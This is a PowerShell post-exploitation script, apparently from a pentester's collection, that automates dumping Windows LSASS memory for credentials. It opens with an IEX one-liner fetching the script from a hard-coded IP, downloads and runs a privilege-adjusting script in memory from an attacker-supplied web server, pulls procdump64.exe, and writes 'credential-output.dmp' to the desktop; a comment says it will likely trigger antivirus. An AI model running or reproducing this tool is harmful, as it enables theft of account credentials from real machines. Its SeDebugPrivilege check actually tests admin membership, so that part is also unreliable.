#IEX (Invoke-WebRequest -Uri "http://172.31.253.141:8000/thescriptvault/privesc/windows/start-dump.ps1")
#This will automate the procdump process, but will likely trigger AV so needs some work. Kali should be configured to host a python web server.

Write-Output "Script started"

# Prompt for IP address and port of the web server
$ipAddress = Read-Host -Prompt "Enter the IP address of the web server"
$port = Read-Host -Prompt "Enter the port number of the web server"
Write-Output "Using web server IP: $ipAddress and port: $port"

# Function to check if SeDebugPrivilege is enabled for the current user
function Check-SeDebugPrivilege {
    Write-Output "Checking SeDebugPrivilege..."
    $user = [System.Security.Principal.WindowsPrincipal]::new([System.Security.Principal.WindowsIdentity]::GetCurrent())
    $privilegeEnabled = $user.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
    return $privilegeEnabled
}

# Step 1: Check if SeDebugPrivilege is already enabled
if (-not (Check-SeDebugPrivilege)) {
    Write-Output "SeDebugPrivilege not enabled; attempting to enable..."

    # Step 2: Download and execute adjust-token-privs.ps1 script in memory
    $scriptUrl = "http://${ipAddress}:${port}/thescriptvault/privesc/windows/adjust-token-privs.ps1"
    try {
        $scriptContent = (Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing).Content
        Write-Output "Downloaded adjust-token-privs.ps1 script content"
        Invoke-Expression $scriptContent
        Adjust-TokenPrivilege -Privilege SeDebugPrivilege
        Write-Output "SeDebugPrivilege enabled."
    } catch {
        Write-Output "Failed to download or execute adjust-token-privs.ps1 script: $_"
    }
} else {
    Write-Output "SeDebugPrivilege is already enabled."
}

# Step 3: Download procdump64.exe to the user's desktop
try {
    $procdumpUrl = "http://${ipAddress}:${port}/thescriptvault/privesc/windows/procdump64.exe"
    $desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "procdump64.exe")
    Invoke-WebRequest -Uri $procdumpUrl -OutFile $desktopPath -UseBasicParsing
    Write-Output "ProcDump downloaded to: $desktopPath"
} catch {
    Write-Output "Failed to download ProcDump: $_"
}

# Step 4: Run ProcDump to capture LSASS dump on the desktop
try {
    & $desktopPath -ma lsass.exe ([System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"), "credential-output.dmp"))
    Write-Output "ProcDump executed to dump LSASS."
} catch {
    Write-Output "Failed to execute ProcDump: $_"
}
